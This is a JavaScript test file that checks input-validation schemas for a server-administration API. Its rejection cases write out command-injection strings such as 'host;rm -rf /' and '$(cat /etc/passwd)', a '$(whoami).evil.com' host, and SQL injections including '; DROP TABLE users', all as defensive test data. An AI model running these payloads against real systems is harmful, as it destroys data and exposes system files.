/**
 * Validation Module Tests
 * Tests for centralized input validation schemas
 */

import { describe, it, expect } from 'vitest';
import {
  hostnameSchema,
  ipv4Schema,
  portSchema,
  unixUsernameSchema,
  packageNameSchema,
  pingRequestSchema,
  dnsLookupSchema,
  portCheckSchema,
  firewallRuleSchema,
  databaseQuerySchema,
  cronJobSchema,
  createServerUserSchema,
  validateBody
} from './validation.js';

describe('hostnameSchema', () => {
  it('should accept valid hostnames', () => {
    expect(hostnameSchema.safeParse('example.com').success).toBe(true);
    expect(hostnameSchema.safeParse('sub.example.com').success).toBe(true);
    expect(hostnameSchema.safeParse('localhost').success).toBe(true);
    expect(hostnameSchema.safeParse('my-server').success).toBe(true);
    expect(hostnameSchema.safeParse('server1.internal.company.com').success).toBe(true);
  });

  it('should reject invalid hostnames', () => {
    expect(hostnameSchema.safeParse('').success).toBe(false);
    expect(hostnameSchema.safeParse('..invalid').success).toBe(false);
    expect(hostnameSchema.safeParse('host;rm -rf /').success).toBe(false);
    expect(hostnameSchema.safeParse('host`whoami`').success).toBe(false);
    expect(hostnameSchema.safeParse('host$(cat /etc/passwd)').success).toBe(false);
    expect(hostnameSchema.safeParse('-invalid').success).toBe(false);
  });
});

describe('ipv4Schema', () => {
  it('should accept valid IPv4 addresses', () => {
    expect(ipv4Schema.safeParse('192.168.1.1').success).toBe(true);
    expect(ipv4Schema.safeParse('10.0.0.1').success).toBe(true);
    expect(ipv4Schema.safeParse('255.255.255.255').success).toBe(true);
    expect(ipv4Schema.safeParse('0.0.0.0').success).toBe(true);
  });

  it('should reject invalid IPv4 addresses', () => {
    expect(ipv4Schema.safeParse('256.1.1.1').success).toBe(false);
    expect(ipv4Schema.safeParse('192.168.1').success).toBe(false);
    expect(ipv4Schema.safeParse('192.168.1.1.1').success).toBe(false);
    expect(ipv4Schema.safeParse('not-an-ip').success).toBe(false);
    expect(ipv4Schema.safeParse('192.168.1.1; cat /etc/passwd').success).toBe(false);
  });
});

describe('portSchema', () => {
  it('should accept valid port numbers', () => {
    expect(portSchema.safeParse(80).success).toBe(true);
    expect(portSchema.safeParse(443).success).toBe(true);
    expect(portSchema.safeParse(1).success).toBe(true);
    expect(portSchema.safeParse(65535).success).toBe(true);
    expect(portSchema.safeParse('8080').success).toBe(true); // String coercion
  });

  it('should reject invalid port numbers', () => {
    expect(portSchema.safeParse(0).success).toBe(false);
    expect(portSchema.safeParse(-1).success).toBe(false);
    expect(portSchema.safeParse(65536).success).toBe(false);
    expect(portSchema.safeParse('abc').success).toBe(false);
  });
});

describe('unixUsernameSchema', () => {
  it('should accept valid unix usernames', () => {
    expect(unixUsernameSchema.safeParse('admin').success).toBe(true);
    expect(unixUsernameSchema.safeParse('_backup').success).toBe(true);
    expect(unixUsernameSchema.safeParse('user123').success).toBe(true);
    expect(unixUsernameSchema.safeParse('my-user').success).toBe(true);
  });

  it('should reject invalid unix usernames', () => {
    expect(unixUsernameSchema.safeParse('').success).toBe(false);
    expect(unixUsernameSchema.safeParse('123user').success).toBe(false);
    expect(unixUsernameSchema.safeParse('-invalid').success).toBe(false);
    expect(unixUsernameSchema.safeParse('user;rm -rf /').success).toBe(false);
    expect(unixUsernameSchema.safeParse('user$(whoami)').success).toBe(false);
  });
});

describe('packageNameSchema', () => {
  it('should accept valid package names', () => {
    expect(packageNameSchema.safeParse('nginx').success).toBe(true);
    expect(packageNameSchema.safeParse('nodejs').success).toBe(true);
    expect(packageNameSchema.safeParse('build-essential').success).toBe(true);
    expect(packageNameSchema.safeParse('gcc-10').success).toBe(true);
    expect(packageNameSchema.safeParse('lib++-dev').success).toBe(true);
  });

  it('should reject invalid package names', () => {
    expect(packageNameSchema.safeParse('').success).toBe(false);
    expect(packageNameSchema.safeParse('pkg;rm -rf /').success).toBe(false);
    expect(packageNameSchema.safeParse('pkg$(whoami)').success).toBe(false);
    expect(packageNameSchema.safeParse('pkg`cat /etc/passwd`').success).toBe(false);
  });
});

describe('pingRequestSchema', () => {
  it('should accept valid ping requests', () => {
    const result = pingRequestSchema.safeParse({ host: 'google.com', count: 4 });
    expect(result.success).toBe(true);
    expect(result.data.host).toBe('google.com');
    expect(result.data.count).toBe(4);
  });

  it('should use default count', () => {
    const result = pingRequestSchema.safeParse({ host: 'google.com' });
    expect(result.success).toBe(true);
    expect(result.data.count).toBe(4);
  });

  it('should reject count out of range', () => {
    expect(pingRequestSchema.safeParse({ host: 'google.com', count: 0 }).success).toBe(false);
    expect(pingRequestSchema.safeParse({ host: 'google.com', count: 11 }).success).toBe(false);
  });

  it('should reject command injection in host', () => {
    expect(pingRequestSchema.safeParse({ host: 'google.com; rm -rf /' }).success).toBe(false);
    expect(pingRequestSchema.safeParse({ host: '$(whoami).evil.com' }).success).toBe(false);
  });
});

describe('dnsLookupSchema', () => {
  it('should accept valid DNS lookup requests', () => {
    const result = dnsLookupSchema.safeParse({ host: 'example.com', type: 'A' });
    expect(result.success).toBe(true);
    expect(result.data.type).toBe('A');
  });

  it('should accept all valid record types', () => {
    const validTypes = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA'];
    for (const type of validTypes) {
      expect(dnsLookupSchema.safeParse({ host: 'example.com', type }).success).toBe(true);
    }
  });

  it('should reject invalid record types', () => {
    expect(dnsLookupSchema.safeParse({ host: 'example.com', type: 'INVALID' }).success).toBe(false);
    expect(dnsLookupSchema.safeParse({ host: 'example.com', type: 'ANY' }).success).toBe(false);
  });
});

describe('portCheckSchema', () => {
  it('should accept valid port check requests', () => {
    const result = portCheckSchema.safeParse({ host: 'localhost', port: 80 });
    expect(result.success).toBe(true);
  });

  it('should reject invalid ports', () => {
    expect(portCheckSchema.safeParse({ host: 'localhost', port: 0 }).success).toBe(false);
    expect(portCheckSchema.safeParse({ host: 'localhost', port: 70000 }).success).toBe(false);
  });
});

describe('firewallRuleSchema', () => {
  it('should accept valid firewall rules', () => {
    const rule = {
      action: 'allow',
      direction: 'in',
      port: '80',
      protocol: 'tcp'
    };
    const result = firewallRuleSchema.safeParse(rule);
    expect(result.success).toBe(true);
  });

  it('should accept all valid actions', () => {
    const actions = ['allow', 'deny', 'reject', 'limit'];
    for (const action of actions) {
      expect(firewallRuleSchema.safeParse({ action, port: '80' }).success).toBe(true);
    }
  });

  it('should reject invalid actions', () => {
    expect(firewallRuleSchema.safeParse({ action: 'drop', port: '80' }).success).toBe(false);
    expect(firewallRuleSchema.safeParse({ action: '; rm -rf /', port: '80' }).success).toBe(false);
  });

  it('should validate port specification', () => {
    expect(firewallRuleSchema.safeParse({ action: 'allow', port: '80' }).success).toBe(true);
    expect(firewallRuleSchema.safeParse({ action: 'allow', port: '80,443' }).success).toBe(true);
    expect(firewallRuleSchema.safeParse({ action: 'allow', port: '80/tcp' }).success).toBe(true);
    expect(firewallRuleSchema.safeParse({ action: 'allow', port: '80; rm -rf /' }).success).toBe(false);
  });
});

describe('databaseQuerySchema', () => {
  it('should accept valid SELECT queries', () => {
    expect(databaseQuerySchema.safeParse({ query: 'SELECT * FROM users' }).success).toBe(true);
    expect(databaseQuerySchema.safeParse({ query: 'SELECT id, name FROM users WHERE active = true' }).success).toBe(true);
    expect(databaseQuerySchema.safeParse({ query: 'SELECT COUNT(*) FROM sessions' }).success).toBe(true);
  });

  it('should reject non-SELECT queries', () => {
    expect(databaseQuerySchema.safeParse({ query: 'INSERT INTO users VALUES (1)' }).success).toBe(false);
    expect(databaseQuerySchema.safeParse({ query: 'UPDATE users SET active = false' }).success).toBe(false);
    expect(databaseQuerySchema.safeParse({ query: 'DELETE FROM users' }).success).toBe(false);
    expect(databaseQuerySchema.safeParse({ query: 'DROP TABLE users' }).success).toBe(false);
  });

  it('should reject dangerous SQL keywords', () => {
    expect(databaseQuerySchema.safeParse({ query: 'SELECT * FROM users; DROP TABLE users' }).success).toBe(false);
    expect(databaseQuerySchema.safeParse({ query: 'SELECT * FROM users UNION SELECT * FROM passwords' }).success).toBe(false);
    expect(databaseQuerySchema.safeParse({ query: 'SELECT * FROM users INTO OUTFILE "/tmp/data"' }).success).toBe(false);
  });

  it('should reject queries with semicolons', () => {
    expect(databaseQuerySchema.safeParse({ query: 'SELECT 1; SELECT 2' }).success).toBe(false);
  });
});

describe('cronJobSchema', () => {
  it('should accept valid cron schedules', () => {
    expect(cronJobSchema.safeParse({ schedule: '0 0 * * *', command: '/usr/bin/backup.sh' }).success).toBe(true);
    expect(cronJobSchema.safeParse({ schedule: '30 2 * * *', command: 'echo test' }).success).toBe(true);
    expect(cronJobSchema.safeParse({ schedule: '0 0 1 1 *', command: 'yearly.sh' }).success).toBe(true);
    expect(cronJobSchema.safeParse({ schedule: '* * * * *', command: 'every-minute.sh' }).success).toBe(true);
  });

  it('should reject invalid cron schedules', () => {
    expect(cronJobSchema.safeParse({ schedule: 'invalid', command: 'test' }).success).toBe(false);
    expect(cronJobSchema.safeParse({ schedule: '60 0 * * *', command: 'test' }).success).toBe(false);
    expect(cronJobSchema.safeParse({ schedule: '0 25 * * *', command: 'test' }).success).toBe(false);
  });
});

describe('createServerUserSchema', () => {
  it('should accept valid user creation requests', () => {
    const user = {
      username: 'testuser',
      fullName: 'Test User',
      shell: '/bin/bash',
      createHome: true,
      groups: ['users', 'docker']
    };
    const result = createServerUserSchema.safeParse(user);
    expect(result.success).toBe(true);
  });

  it('should use defaults', () => {
    const result = createServerUserSchema.safeParse({ username: 'testuser' });
    expect(result.success).toBe(true);
    expect(result.data.shell).toBe('/bin/bash');
    expect(result.data.createHome).toBe(true);
    expect(result.data.groups).toEqual([]);
  });

  it('should reject invalid usernames', () => {
    expect(createServerUserSchema.safeParse({ username: 'root; rm -rf /' }).success).toBe(false);
    expect(createServerUserSchema.safeParse({ username: '-invalid' }).success).toBe(false);
  });

  it('should validate shell paths', () => {
    expect(createServerUserSchema.safeParse({ username: 'test', shell: '/bin/bash' }).success).toBe(true);
    expect(createServerUserSchema.safeParse({ username: 'test', shell: '/bin/zsh' }).success).toBe(true);
    expect(createServerUserSchema.safeParse({ username: 'test', shell: 'not-a-path' }).success).toBe(false);
    expect(createServerUserSchema.safeParse({ username: 'test', shell: '/bin/bash; rm -rf /' }).success).toBe(false);
  });
});

describe('validateBody helper', () => {
  it('should return success with validated data', () => {
    const result = validateBody(hostnameSchema, 'example.com');
    expect(result.success).toBe(true);
    expect(result.data).toBe('example.com');
  });

  it('should return error message on failure', () => {
    const result = validateBody(hostnameSchema, '');
    expect(result.success).toBe(false);
    expect(result.error).toBeDefined();
  });
});
